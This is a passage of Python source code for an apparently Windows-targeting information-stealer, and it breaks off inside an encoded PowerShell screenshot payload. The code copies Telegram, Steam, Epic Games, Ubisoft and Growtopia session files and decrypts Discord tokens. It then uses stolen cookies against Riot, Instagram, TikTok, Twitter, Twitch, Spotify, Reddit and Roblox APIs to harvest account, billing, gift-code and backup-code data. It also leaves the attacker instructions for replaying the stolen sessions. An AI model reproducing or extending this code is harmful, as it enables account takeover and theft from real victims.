                        write_file.write("First, open this file path on your computer <%localappdata%\\Ubisoft Game Launcher>.\nDelete all the files here, then copy the stolen files to this folder.\nAfter all this run ubisoft")
        except:
            pass
    async def StealEpicGames(self, uuid:str) -> None:
        try:
            found_epic = False
            epic_path = os.path.join(self.LocalAppData, "EpicGamesLauncher", "Saved", "Config", "Windows")
            copied_path = os.path.join(self.Temp, uuid, "Games", "Epic Games")
            if os.path.isdir(epic_path):
                if not os.path.exists(copied_path):
                    os.mkdir(copied_path)
                try:
                    shutil.copytree(epic_path, os.path.join(copied_path, "Windows"))
                    found_epic = True
                except:
                    pass
            if found_epic == True:
                with open(os.path.join(copied_path, "How to Use.txt"), "a", errors="ignore") as write_file:
                    write_file.write("=========================================================================\n")
                    write_file.write("First, open this file path on your computer <%localappdata%\\EpicGamesLauncher\\Saved\\Config\\Windows>.\nDelete all the files here, then copy the stolen files to this folder.\nAfter all this run epic games")
        except Exception as e:
            print(str(e))
    async def StealGrowtopia(self, uuid:str) -> None:
        try:
            found_growtopia = False
            growtopia_path = os.path.join(self.LocalAppData, "Growtopia", "save.dat")
            copied_path = os.path.join(self.Temp, uuid, "Games", "Growtopia")
            if os.path.isfile(growtopia_path):
                found_growtopia = True
                shutil.copy(growtopia_path, os.path.join(copied_path, "save.dat"))
            if found_growtopia == True:
                os.mkdir(os.path.join(copied_path, "How to Use"))
                with open(os.path.join(copied_path, "How to Use", "How to Use.txt"), "a", errors="ignore") as write_file:
                    write_file.write("=========================================================================\n")
                    write_file.write("First, open this file path on your computer <%localappdata%\\Growtopia>.\nReplace 'save.dat' with the stolen file.")
        except:
            pass
    async def StealTelegramSession(self, directory_path: str) -> None:
        try:
            found_tg = False
            tg_path = os.path.join(self.RoamingAppData, "Telegram Desktop", "tdata")
            if os.path.exists(tg_path):
                copy_path = os.path.join(directory_path, "Telegram Session")
                black_listed_dirs = ["dumps", "emojis", "user_data", "working", "emoji", "tdummy", "user_data#2", "user_data#3", "user_data#4", "user_data#5"]
                processes = await asyncio.create_subprocess_shell(f"taskkill /F /IM Telegram.exe", shell=True, stdout=asyncio.subprocess.PIPE, stderr=asyncio.subprocess.PIPE)
                await processes.communicate() 
                if not os.path.exists(copy_path):
                    os.mkdir(copy_path)
                for dirs in os.listdir(tg_path):
                    try:
                        _path = os.path.join(tg_path, dirs)
                        if not dirs in black_listed_dirs:
                            dir_name = _path.split("\\")[7]
                            if os.path.isfile(_path):
                                shutil.copyfile(_path, os.path.join(copy_path, dir_name))
                            elif os.path.isdir(_path):
                                shutil.copytree(_path, os.path.join(copy_path, dir_name))
                            found_tg = True
                    except:continue
                if found_tg == True:
                    os.mkdir(os.path.join(copy_path, "How to Use"))
                    with open(os.path.join(copy_path, "How to Use", "How to Use.txt"), "a", errors="ignore") as write_file:
                        write_file.write("==================================================================\n")
                        write_file.write("First, close your telegram\nopen this file path on your computer <%appdata%\\Telegram Desktop\\tdata>.\nDelete all the files here, then copy the stolen files to this folder")
        except:
            pass
    async def RiotGamesSession(self, cookie, browser:str) -> None:
        try:
            url = 'https://account.riotgames.com/api/account/v1/user'
            response = requests.get(url, headers={"Cookie": f"sid={cookie}"}).json()

            username = response['username']
            email = response['email']
            region = response['region']
            locale = response['locale']
            country = response['country']
            mfa = response['mfa']['verified']

        except Exception as e:
            print(f"An error occurred in riot game: {str(e)}")

        else:
            Variables.RiotGameAccounts.append(f'Browser Name: {browser}\nUsername : {username}\nEmail : {email}\nRegion : {region}\nLocale : {locale}\nCountry : {country}\nMFA Enabled : {mfa}\nCookie : {cookie}\n======================================================================\n')
    async def InstaSession(self, cookie, browser:str) -> None:
        try:
            bio = ""
            fullname = ""
            headers = {
                    "user-agent": "Instagram 219.0.0.12.117 Android",
                    "cookie": f"sessionid={cookie}"
                }
            
            url = 'https://i.instagram.com/api/v1/accounts/current_user/?edit=true'
            url2 = f"https://i.instagram.com/api/v1/users/{data['user']['pk']}/info/"

            data = requests.get(url, headers=headers).json()
            data2 = requests.get(url2, headers=headers).json()
            
            username = data["user"]["username"]
            profileURL = f"https://instagram.com/{username}"

            if data["user"]["biography"] == "":
                bio = "No bio"
            else:
                bio = data["user"]["biography"]
            bio = bio.replace("\n", ", ")
            if data["user"]["full_name"] == "":
                fullname = "No nickname"
            else:
                fullname = data["user"]["full_name"]

            email = data["user"]["email"]
            verify = str(data["user"]["is_verified"])
            followers = str(data2["user"]["follower_count"])
            following = str(data2["user"]["following_count"])
            

            
        except Exception as e:
            print(f'on instagram fonction {str(e)}')
        else:
            Variables.InstagramAccounts.append(f"Browser Name: {browser}\nCookie : {cookie}\nProfile URL : {profileURL}\nUsername : {username}\nNick Name : {fullname}\nis Verified : {verify}\nEmail : {email}\nFollowers : {followers}\nFollowing : {following}\nBiography : {bio}\n======================================================================\n")
    async def TikTokSession(self, cookie, browser:str) -> None:
        try:
            email = ''
            phone = ''
            cookies = "sessionid=" + cookie
            headers = {"cookie": cookies, "Accept-Encoding": "identity"}
            headers2 = {"cookie": cookies}

            url = 'https://www.tiktok.com/passport/web/account/info/?aid=1459&app_language=de-DE&app_name=tiktok_web&battery_info=1&browser_language=de-DE&browser_name=Mozilla&browser_online=true&browser_platform=Win32&browser_version=5.0%20%28Windows%20NT%2010.0%3B%20Win64%3B%20x64%29%20AppleWebKit%2F537.36%20%28KHTML%2C%20like%20Gecko%29%20Chrome%2F112.0.0.0%20Safari%2F537.36&channel=tiktok_web&cookie_enabled=true&device_platform=web_pc&focus_state=true&from_page=fyp&history_len=2&is_fullscreen=false&is_page_visible=true&os=windows&priority_region=DE&referer=&region=DE&screen_height=1080&screen_width=1920&tz_name=Europe%2FBerlin&webcast_language=de-DE'
            url2 = 'https://webcast.tiktok.com/webcast/wallet_api/diamond_buy/permission/?aid=1988&app_language=de-DE&app_name=tiktok_web&battery_info=1&browser_language=de-DE&browser_name=Mozilla&browser_online=true&browser_platform=Win32&browser_version=5.0%20%28Windows%20NT%2010.0%3B%20Win64%3B%20x64%29%20AppleWebKit%2F537.36%20%28KHTML%2C%20like%20Gecko%29%20Chrome%2F112.0.0.0%20Safari%2F537.36&channel=tiktok_web&cookie_enabled=true'

            data = requests.get(url, headers=headers).json()
            data2 = requests.get(url2, headers=headers2).json()
            

            user_id = str(data["data"]["user_id"])
            if not data["data"]["email"]:
                email = "No Email"
            else:
                email = data["data"]["email"]
            if not data["data"]["mobile"]:
                phone = "No number"
            else:
                phone = str(data["data"]["mobile"])
            username = data["data"]["username"]
            coins = str(data2["data"]["coins"])
            profileUrl = f'https://tiktok.com/@{username}'
            uid = data["data"]["sec_user_id"]
            timestamp = data["data"]["create_time"]
            formatted_date = time.strftime('%Y-%m-%d %H:%M:%S', time.localtime(timestamp))
            try:
                url3 = f'https://www.tiktok.com/api/user/list/?count=1&minCursor=0&scene=67&secUid={uid}'
                data3 = requests.get(url3, headers=headers, cookies=cookies).json()
                subscriber = data3["total"]
            except Exception as e:
                error_Handler(e)
                subscriber = "0"

        except:
            pass
        else:
            Variables.TikTokAccounts.append(f"Browser Name: {browser}\nProfile URL: {profileUrl}\nCookie : {cookies}\nUser identifier : {user_id}\nProfile URL : https://tiktok.com/@{username}\nUsername : {username}\nEmail : {email}\nPhone : {phone}\nCoins : {coins}\nSuscriber! {subscriber}\nCreated Date: {formatted_date}\n======================================================================\n")

    async def TwitterSession(self, cookie, browser:str) -> None:
        try:
            description = ''
            authToken = f'{cookie};ct0=ac1aa9d58c8798f0932410a1a564eb42'
            headers = {
                'authority': 'twitter.com',
                'accept': '*/*',
                'accept-language': 'en-US,en;q=0.9',
                'authorization': 'Bearer AAAAAAAAAAAAAAAAAAAAANRILgAAAAAAnNwIzUejRCOuH5E6I8xnZz4puTs%3D1Zv7ttfk8LF81IUq16cHjhLTvJu4FA33AGWWjCpTnA',
                'origin': 'https://twitter.com',
                'referer': 'https://twitter.com/home',
                'sec-fetch-dest': 'empty',
                'sec-fetch-mode': 'cors',
                'sec-fetch-site': 'same-origin',
                'sec-gpc': '1',
                'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/106.0.0.0 Safari/537.36',
                'x-twitter-active-user': 'yes',
                'x-twitter-auth-type': 'OAuth2Session',
                'x-twitter-client-language': 'en',
                'x-csrf-token': 'ac1aa9d58c8798f0932410a1a564eb42',
                "cookie" : f'auth_token={authToken}'
            }
            req = requests.get("https://twitter.com/i/api/1.1/account/update_profile.json", headers=headers).json()

            try:
                if req["description"] == "":
                    description = "There is no bio"
                else:
                    description = req["description"]
            except:
                description = "There is no biography"
            description = description.replace("\n", ", ")
            
            username = req["name"]
            nickname = req["screen_name"]
            profileURL = f"https://twitter.com/{username}"
            followers = str(req['followers_count'])
            friends = str(req['friends_count'])
            status = str(req['statuses_count'])
            verify = str(req['verified'])
            created_at = str(req['created_at'])
            
            Variables.TwitterAccounts.append(f"Browser Name: {browser}\nUsername : {username}\nScreen Name : {nickname}\nFollowers : {followers}\nFollowing : {friends}\nTweets : {status}\nVerified : {verify}\nCreated At : {created_at}\nProfile URL : {profileURL}\nCookie : {cookie}\nBiography : {description}\n=====================================================\n")
        except Exception as e:
            print(str(e))

    
    async def TwitchSession(self, auth_token, username, browser:str) -> None:
        try:
            url = 'https://gql.twitch.tv/gql'
            headers = {
                'Authorization': f'OAuth {auth_token}',
                'Content-Type': 'application/json',
            }

            query = f"""
            
            query {{
                user(login: "{username}") {{
                    id
                    login
                    displayName
                    email
                    hasPrime
                    isPartner
                    language
                    profileImageURL(width: 300)
                    bitsBalance
                    followers {{
                        totalCount
                    }}
                }}
            }}
            """

            data = {
                "query": query
            }

            response = requests.post(url, headers=headers, json=data).json()
            userid= response["data"]["user"]["id"] if response["data"]["user"]["id"] else "Coudn't get user ID"
            login= response["data"]["user"]["login"] if response["data"]["user"]["login"] else "Coudn't get user login"
            displayName= response["data"]["user"]["displayName"] if response["data"]["user"]["displayName"] else "Coudn't get user Display Name"
            email = response["data"]["user"]["email"] if response["data"]["user"]["email"] else "Coudn't get user email"
            hasPrime ='True' if response["data"]["user"]["hasPrime"] == True else "False"
            
            isPartner = 'True' if response["data"]["user"]["isPartner"] == True else "False"
            language = response["data"]["user"]["language"] if response["data"]["user"]["language"] else "Coudn't get language"
            pfp = response["data"]["user"]["profileImageURL"] if response["data"]["user"]["profileImageURL"] else None
            bits = response["data"]["user"]["bitsBalance"] if response["data"]["user"]["bitsBalance"] else "0"
            sub = response["data"]["user"]["followers"]["totalCount"] if response["data"]["user"]["followers"]["totalCount"] else "Coudn't get followers numbers"

        except:
            pass
        else:
            Variables.TwtichAccounts.append(f"User ID/Login/Display Name: {userid} - {login} - {displayName}\nEmail: {email}\nPrime: {hasPrime}\nUsername: {username}\nBits: {bits}\nPartner: {isPartner}\nFollowers: {sub}\nLanguage: {language}\nBrowser Name: {browser}\nCookie : {auth_token}\n======================================================================\n")
    async def SpotifySession(self, cookie, browser:str) -> None:
        try:
            headers ={
                'cookie':f'sp_dc={cookie}'
            }
            
            
            accountdata = requests.get('https://www.spotify.com/api/account-settings/v1/profile', headers=headers).json()
            email = accountdata["profile"]["email"] if accountdata["profile"]["email"] else 'No Email'
            gender = accountdata["profile"]["gender"] if accountdata["profile"]["gender"] else 'No Gender'
            birthdate = accountdata["profile"]["birthdate"] if accountdata["profile"]["birthdate"] else 'No Birthdate'
            country = accountdata["profile"]["country"] if accountdata["profile"]["country"] else 'No Country'
            username = accountdata["profile"]["username"] if accountdata["profile"]["username"] else 'No Username'
            
            sub = requests.get('https://www.spotify.com/eg-en/api/account/v1/datalayer/', headers=headers).json()
            
            profileUrl = f'https://www.spotify.com/{username}'
            Trial = '✅' if sub["isTrialUser"]!= None else '❌'
            plan = sub["currentPlan"] if sub["currentPlan"] else 'Error getting plan'
            age = sub["accountAgeDays"] if sub["accountAgeDays"] else 'Error getting creation date'
            current_timestamp = time.time()
            timestamp = current_timestamp - (age * 24 * 60 * 60)
            date = time.strftime("%Y-%m-%d", time.localtime(timestamp))
            

        except:
            pass
        else:
            Variables.SpotifyAccounts.append(f"Username: {username}\nEmail: {email}\nProfile URL: {profileUrl}\nGender: {gender}\nBirthdate: {birthdate}\nCountry: {country}\nTrial User: {Trial}\nPlan: {plan.capitalize()}\nCreation Date: {date}\nBrowser Name: {browser}\nCookie : {cookie}\n======================================================================\n")
    async def RedditSession(self, cookie, browser:str) -> None:
        try:
            gmail = ""
            cookies = "reddit_session=" + cookie

            headers = {
                    "cookie": cookies,
                    "Authorization": "Basic b2hYcG9xclpZdWIxa2c6"
                }
            
            headers2 = {
                    'User-Agent': 'android:com.example.myredditapp:v1.2.3',
                    "Authorization": "Bearer " + accessToken
                }
            
            jsonData = {"scopes": ["*", "email", "pii"]}

            response = requests.get('https://accounts.reddit.com/api/access_token', headers=headers, json=jsonData).json()
            data2 = requests.get('https://oauth.reddit.com/api/v1/me', headers=headers2).json()
                
            accessToken = response["access_token"]

            if data2["email"] == "":
                gmail = "No email"
            else:
                gmail = data2["email"]
            
            username = data2["name"]
            profileUrl = 'https://www.reddit.com/user/' + username
            commentKarma = data2["comment_karma"]
            totalKarma = data2["total_karma"]
            coins = data2["coins"]
            mod = data2["is_mod"]
            gold = data2["is_gold"]
            suspended = data2["is_suspended"]
                
        except:
            pass
        else:
            Variables.RedditAccounts.append(f"Browser Name: {browser}Coins: {coins}\nCookie : {cookies}\nProfile URL : {profileUrl}\nUsername : {username}\nEmail : {gmail}\nComment Karma : {commentKarma}\nTotal Karma : {totalKarma}\nis Mod : {mod}\nis Gold : {gold}\nSuspended : {suspended}\n======================================================================\n")
    async def RobloxSession(self, cookie, browser:str) -> None:
        def GetAll(UserID: int) -> list:
            try:
                FullList = []
                response = requests.get(f'https://friends.roblox.com/v1/users/{UserID}/friends')
                Friendslist = loads(response.text)

                if 'data' in Friendslist:
                    x = 0
                    for friend in Friendslist['data']:
                        if x == 3:
                            return FullList
                        
                        is_banned = friend.get('isBanned', False)
                        has_verified_badge = friend.get('hasVerifiedBadge', False)

                        banned_status = "❌" if is_banned == False else "✅"
                        verified_status = "❌" if has_verified_badge == False else "✅"

                        FullList.append((friend.get('displayName', ''), friend.get('name', ''), banned_status, verified_status))
                        x += 1
                    return FullList
                else:
                    raise ValueError("No 'data' key in the response.")
            except Exception as e:
                error_Handler(e)
                return []
            
        def GetRAP(UserID):

            ErroredRAP = 0
            TotalValue = 0
            Cursor = ""
            Done = False
            while(Done == False):
                try:
                    response = requests.get(f"https://inventory.roblox.com/v1/users/{UserID}/assets/collectibles?sortOrder=Asc&limit=100&cursor={Cursor}")
                    Items = response.json()
                    if((response.json()['nextPageCursor'] == "null") or response.json()['nextPageCursor'] == None):
                        Done = True
                    else:
                        Done = False
                        Cursor = response.json()['nextPageCursor']
                    for Item in Items["data"]:
                        try:
                            RAP = int((Item['recentAveragePrice']))
                            TotalValue = TotalValue + RAP
                        except:
                            TotalValue = TotalValue
                    if(response.json()['nextPageCursor'] == 'None'):
                        Done = True
                    
                except Exception as ex:
                    Done = True
            return(TotalValue)

        try:

            baseinf = requests.get("https://www.roblox.com/mobileapi/userinfo", cookies = {".ROBLOSECURITY": cookie}).json()
            username, userId, robux, thumbnail, premium, builderclub = baseinf["UserName"], baseinf["UserID"], baseinf["RobuxBalance"],baseinf["ThumbnailUrl"], baseinf["IsPremium"],baseinf["IsAnyBuildersClubMember"]
            
            friendlist = GetAll(userId)
            rap = GetRAP(userId)
            
            if premium == True:
                premium = '✅'
            else:
                premium = '❌'
            if builderclub == True:
                builderclub = '✅'
            else:
                premium = '❌'

            advancedInfo = requests.get(f"https://users.roblox.com/v1/users/{userId}").json()
            description = 'No Description'
            if advancedInfo["description"]:
                description = advancedInfo["description"]
            if advancedInfo["description"] == True:
                banned = '✅'
            else: 
                banned = '❌'
            creationDate = advancedInfo["created"]
            creationDate = creationDate.split("T")[0].split("-")
            creationDate = f"{creationDate[1]}/{creationDate[2]}/{creationDate[0]}"
            creation_timestamp = time.mktime(time.strptime(creationDate, "%m/%d/%Y"))
            current_timestamp = time.time()
            seconds_passed = current_timestamp - creation_timestamp
            days_passed = round(seconds_passed / (24 * 60 * 60))

        except:
            pass
        else:
            Variables.RobloxAccounts.append(f"User Info: {username} ({userId})\nThumbnail: {thumbnail}\nRobux: {robux}\nPremium: {premium}\nCreation Date: {creationDate} + {days_passed} Days!\nDescription: {description}\nBanned: {banned}\nRAP: {rap}\nBrowser: {browser}\nCookie : {cookie}\n======================================================================\n")
    async def GetTokens(self) -> None:
        try:
            discord_dirs = {
                "Discord" : os.path.join(self.RoamingAppData, "discord", "Local Storage", "leveldb"),
                "Discord Canary" : os.path.join(self.RoamingAppData, "discordcanary", "Local Storage", "leveldb"),
                "Lightcord" : os.path.join(self.RoamingAppData, "Lightcord", "Local Storage", "leveldb"),
                "Discord PTB" : os.path.join(self.RoamingAppData, "discordptb", "Local Storage", "leveldb"),
            }
            dirs = list()
            for r, discord_dir in discord_dirs.items():
                if os.path.isdir(discord_dir):
                    dirs.append(discord_dir)
            for x in self.profiles_full_path:
                if not x.endswith("leveldb"):
                    new_path = os.path.join(x, "Local Storage","leveldb")
                    if os.path.isdir(new_path):
                        dirs.append(new_path)
            for directorys in dirs:
                full_tokens = Variables.FullTokens
                if "cord" in directorys:  # extract tokens from discord 
                    key = SubModules.GetKey(directorys.replace(r"Local Storage\leveldb", "Local State"))
                    for y in os.listdir(directorys):
                        full_path = os.path.join(directorys, y)
                        if full_path[-3:] in ["log", "ldb"]:
                            with open(full_path, "r", encoding="utf-8", errors="ignore") as files:
                                for tokens in re.findall(r"dQw4w9WgXcQ:[^.*\['(.*)'\].*$][^\"]*", files.read()):
                                    if tokens:
                                        enc_token = base64.b64decode(tokens.split("dQw4w9WgXcQ:")[1])
                                        dec_token = SubModules.Decrpytion(enc_token, key)
                                        if not dec_token in full_tokens:
                                            full_tokens.append(dec_token)
                                            await self.ValidateTokenAndGetInfo(dec_token)
                                        else:
                                            continue                                      
                else: # extract tokens from browsers
                    for x in os.listdir(directorys):
                        file_name = os.path.join(directorys, x)
                        if file_name[-3:] in ["log", "ldb"]:
                            with open(file_name, "r" ,encoding="utf-8", errors="ignore") as file:
                                for token in re.findall(r"[\w-]{24}\.[\w-]{6}\.[\w-]{25,110}", r"mfa\.[\w-]{80,95}", file.read()):
                                    if token:
                                        if not token in full_tokens:
                                            full_tokens.append(token)
                                            await self.ValidateTokenAndGetInfo(token)
                                        else:
                                            continue
        except:
            pass

    async def ValidateTokenAndGetInfo(self, token:str) -> None:
        try:
            baddglist = [
                {"N": 'Active_Developer', 'V': 4194304, 'E': 'Active Developer '},
                {"N": 'Early_Verified_Bot_Developer', 'V': 131072, 'E': "Early Verified Bot Developer "},
                {"N": 'Bug_Hunter_Level_2', 'V': 16384, 'E': "Bug Hunter Level 2 "},
                {"N": 'Early_Supporter', 'V': 512, 'E': "Early Supporter "},
                {"N": 'House_Balance', 'V': 256, 'E': "House Balance "},
                {"N": 'House_Brilliance', 'V': 128, 'E': "House Brilliance "},
                {"N": 'House_Bravery', 'V': 64, 'E': "House Bravery "},
                {"N": 'Bug_Hunter_Level_1', 'V': 8, 'E': "Bug Hunter Level 1 "},
                {"N": 'HypeSquad_Events', 'V': 4, 'E': "HypeSquad Events "},
                {"N": 'Partnered_Server_Owner', 'V': 2, 'E': "Partner Server Owner "},
                {"N": 'Discord_Employee', 'V': 1, 'E': "Discord Employee "}
            ]

            def get_badge(flags):
                if flags == 0:
                    return ''

                owned_badges = ''
                for badge in baddglist:
                    if flags // badge["V"] != 0:
                        owned_badges += badge["E"]
                        flags = flags % badge["V"]
                return owned_badges
            
            def get_tokq_info(token):
                try:
                    headers = {
                        "Authorization": token,
                        "Content-Type": "application/json",
                        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:102.0) Gecko/20100101 Firefox/102.0"
                    }

                    response = requests.get("https://discord.com/api/v10/users/@me", headers=headers)
                   
                    if response.status_code == 200:
                        user_info = response.json()
                        global_name = user_info["global_name"]
                        username = user_info["username"]
                        hashtag = user_info["discriminator"]
                        user_id = user_info["id"]
                        bio = "None"
                        if "bio" in user_info: bio = user_info["bio"]
                        if len(bio) > 70: bio = bio[:67] + "..."
                        phone = "-"
                        if "phone" in user_info:
                            phone = user_info["phone"]
                        mfa = user_info["mfa_enabled"]
                        verified = user_info["verified"]
                        ema = user_info["email"]
                        flags = user_info["public_flags"]
                        nitros = "No Nitro"
                        if "premium_type" in user_info:
                            nitros = user_info["premium_type"]
                            if nitros == 1:
                                nitros = "Nitro Classic "
                            elif nitros == 2:
                                nitros = "Nitro Boost "
                            elif nitros == 3:
                                nitros = "Nitro Basic "

                        return username, bio, hashtag, ema, user_id, flags, nitros, phone, mfa, verified, global_name
                    return None  # Retourner None en cas d'erreur de la requête
                except:
                    return None


            def GetBilling(token):
                try:
                    headers = {
                        "Authorization": token,
                        "Content-Type": "application/json",
                        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:102.0) Gecko/20100101 Firefox/102.0"
                    }
                    try:
                        billingjson = loads(urlopen(Request("https://discord.com/api/users/@me/billing/payment-sources", headers=headers)).read().decode())
                    except:
                        return False

                    if billingjson == []: return " -"

                    billing = ""
                    for methode in billingjson:
                        if methode["invalid"] == False:
                            if methode["type"] == 1:
                                billing += "Credit_Card"
                            elif methode["type"] == 2:
                                billing += "PayPal "

                    return billing
                except Exception as e:
                    error_Handler(e)

            def GetBack():
                    path = os.environ["HOMEPATH"]
                    code_path = '\\Downloads\\discord_backup_codes.txt'
                    full = path + code_path
                    if os.path.exists(full):
                        with open(full, 'r', encoding='utf-8') as f:
                            backup = f.readlines()
                        return backup
                    return "No backup code saved"
            
            def get_gift_codes(token):
                response = requests.get('https://discord.com/api/v10/users/@me/outbound-promotions/codes', headers={'Authorization': token})
                if response.status_code == 200:
                    gift_codes = response.json()
                    if gift_codes:
                        codes = []
                        for code in gift_codes:
                            try:
                                name = code['promotion']['outbound_title']
                                code_value = code['code']
                                data = f"Name of Gift: {name}\nCode Value: {code_value}"
                                codes.append(data)
                            except Exception as e:
                                error_Handler(f'Gift Code Name Error: {str(e)}')
                        return "\n\n".join(codes) if codes else "No Gift"
                    else:
                        return "No Gift"
                else:
                    return f"No Gift"
                return "No Gift"

            username, bio, hashtag, ema, user_id, flags, nitros, phone, mfa, verified, global_name = get_tokq_info(token)
            back = GetBack()
            badge = get_badge(flags)  
            gift = get_gift_codes(token)
            billing = GetBilling(token)

            if not billing:
                billing = "No Billing"
            if not nitros:
                nitros = 'No Nitro'
            if not badge:
                badge = "No Badges"
            if not phone:
                phone = "No Phone"
            if hashtag == '0':
                hashtag = ''

            Variables.DiscordAccounts.append(f"Global Name: {global_name}\nUser Profile: {username}#{hashtag} ({user_id})\nToken: {token}\nPhone: {phone}\nEmail: {ema}\nVerified?: {verified}\nMFA Enabled?: {mfa}\nBadges: {nitros} - {badge}\nBilling: {billing}\n\nBiography: \n{bio}\n\nGift: \n{gift}\n\nBackup Code: \n{back}\n======================================================================\n")

        except Exception as e:
            error_Handler(e)
           
    async def StealSteamSessionFiles(self, uuid:str) -> None:
        try:
            save_path = os.path.join(self.Temp, uuid)
            steam_path = os.path.join("C:\\", "Program Files (x86)", "Steam", "config")
            if os.path.isdir(steam_path):
                to_path = os.path.join(save_path, "Games", "Steam")
                if not os.path.isdir(to_path):
                    os.mkdir(to_path)
                shutil.copytree(steam_path, os.path.join(to_path, "Session Files"))
                with open(os.path.join(to_path, "How to Use.txt"),"w", errors="ignore", encoding="utf-8") as file:
                    file.write("======================================================================\nFirst close your steam and open this folder on your Computer, <C:\\Program Files (x86)\\Steam\\config>\nSecond Replace all this files with stolen Files\nFinally you can start steam.\n")
        except:
            return "null"
    
    async def WriteToText(self) -> None:
        try:
            cmd = "wmic csproduct get uuid"
            process = await asyncio.create_subprocess_shell(
                cmd,
                stdout=asyncio.subprocess.PIPE,
                stderr=asyncio.subprocess.PIPE,
                shell=True
            )
            
            stdout, stderr = await process.communicate()
            output_lines = stdout.decode(errors="ignore").split("\n")
            uuid = output_lines[1].strip() if len(output_lines) > 1 else None
            filePath = os.path.join(self.Temp, uuid)
            if os.path.isdir(filePath):
                shutil.rmtree(filePath)
            os.mkdir(filePath)
            os.mkdir(os.path.join(filePath, "Browsers"))
            os.mkdir(os.path.join(filePath, "Sessions"))
            os.mkdir(os.path.join(filePath, "Tokens"))
            os.mkdir(os.path.join(filePath, "Games"))
            await self.GetWallets(filePath)
            await self.StealTelegramSession(filePath)
            await self.StealUplay(uuid)
            await self.StealEpicGames(uuid)
            await self.StealGrowtopia(uuid)
            await self.StealSteamSessionFiles(uuid)
            if len(os.listdir(os.path.join(filePath, "Games"))) == 0:
                try:
                    shutil.rmtree(os.path.join(filePath, "Games"))
                except:pass
            if self.FireFox:
                os.mkdir(os.path.join(filePath, "Browsers", "Firefox"))
            command = "JABzAG8AdQByAGMAZQAgAD0AIABAACIADQAKAHUAcwBpAG4AZwAgAFMAeQBzAHQAZQBtADsADQAKAHUAcwBpAG4AZwAgAFMAeQBzAHQAZQBtAC4AQwBvAGwAbABlAGMAdABpAG8AbgBzAC4ARwBlAG4AZQByAGkAYwA7AA0ACgB1AHMAaQBuAGcAIABTAHkAcwB0AGUAbQAuAEQAcgBhAHcAaQBuAGcAOwANAAoAdQBzAGkAbgBnACAAUwB5AHMAdABlAG0ALgBXAGkAbgBkAG8AdwBzAC4ARgBvAHIAbQBzADsADQAKAA0ACgBwAHUAYgBsAGkAYwAgAGMAbABhAHMAcwAgAFMAYwByAGUAZQBuAHMAaABvAHQADQAKAHsADQAKACAAIAAgACAAcAB1AGIAbABpAGMAIABzAHQAYQB0AGkAYwAgAEwAaQBzAHQAPABCAGkAdABtAGEAcAA+ACAAQwBhAHAAdAB1AHIAZQBTAGMAcgBlAGUAbgBzACgAKQANAAoAIAAgACAAIAB7AA0ACgAgACAAIAAgACAAIAAgACAAdgBhAHIAIAByAGUAcwB1AGwAdABzACAAPQAgAG4AZQB3ACAATABpAHMAdAA8AEIAaQB0AG0AYQBwAD4AKAApADsADQAKACAAIAAgACAAIAAgACAAIAB2AGEAcgAgAGEAbABsAFMAYwByAGUAZQBuAHMAIAA9ACAAUwBjAHIAZQBlAG4ALgBBAGwAbABTAGMAcgBlAGUAbgBzADsADQAKAA0ACgAgACAAIAAgACAAIAAgACAAZgBvAHIAZQBhAGMAaAAgACgAUwBjAHIAZQBlAG4AIABzAGMAcgBlAGUAbgAgAGkAbgAgAGEAbABsAFMAYwByAGUAZQBuAHMAKQANAAoAIAAgACAAIAAgACAAIAAgAHsADQAKACAAIAAgACAAIAAgACAAIAAgACAAIAAgAHQAcgB5AA0ACgAgACAAIAAgACAAIAAgACAAIAAgACAAIAB7AA0ACgAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgAFIAZQBjAHQAYQBuAGcAbABlACAAYgBvAHUAbgBkAHMAIAA9ACAAcwBjAHIAZQBlAG4ALgBCAG8AdQBuAGQAcwA7AA0ACgAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgAHUAcwBpAG4AZwAgACgAQgBpAHQAbQBhAHAAIABiAGkAdABtAGEAcAAgAD0AIABuAGUAdwAgAEIAaQB0AG0AYQBwACgAYgBvAHUAbgBkAHMALgBXAGkAZAB0AGgALAAgAGIAbwB1AG4AZABzAC4ASABlAGkAZwBoAHQAKQApAA0ACgAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgAHsADQAKACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAB1AHMAaQBuAGcAIAAoAEcAcgBhAHAAaABpAGMAcwAgAGcAcgBhAHAAaABpAGMAcwAgAD0AIABHAHIAYQBwAGgAaQBjAHMALgBGAHIAbwBtAEkAbQBhAGcAZQAoAGIAaQB0AG0AYQBwACkAKQANAAoAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgAHsADQAKACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgAGcAcgBhAHAAaABpAGMAcwAuAEMAbwBwAHkARgByAG8AbQBTAGMAcgBlAGUAbgAoAG4AZQB3ACAAUABvAGkAbgB0ACgAYgBvAHUAbgBkAHMALgBMAGUAZgB0ACwAIABiAG8AdQBuAGQAcwAuAFQAbwBwACkALAAgAFAAbwBpAG4AdAAuAEUAbQBwAHQAeQAsACAAYgBvAHUAbgBkAHMALgBTAGkAegBlACkAOwANAAoAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgAH0ADQAKAA0ACgAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAcgBlAHMAdQBsAHQAcwAuAEEAZABkACgAKABCAGkAdABtAGEAcAApAGIAaQB0AG0AYQBwAC4AQwBsAG8AbgBlACgAKQApADsADQAKACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAfQANAAoAIAAgACAAIAAgACAAIAAgACAAIAAgACAAfQANAAoAIAAgACAAIAAgACAAIAAgACAAIAAgACAAYwBhAHQAYwBoACAAKABFAHgAYwBlAHAAdABpAG8AbgApAA0ACgAgACAAIAAgACAAIAAgACAAIAAgACAAIAB7AA0ACgAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgAC8ALwAgAEgAYQBuAGQAbABlACAAYQBuAHkAIABlAHgAYwBlAHAAdABpAG8AbgBzACAAaABlAHIAZQANAAoAIAAgACAAIAAgACAAIAAgACAAIAAgACAAfQANAAoAIAAgACAAIAAgACAAIAAgAH0ADQAKAA0ACgAgACAAIAAgACAAIA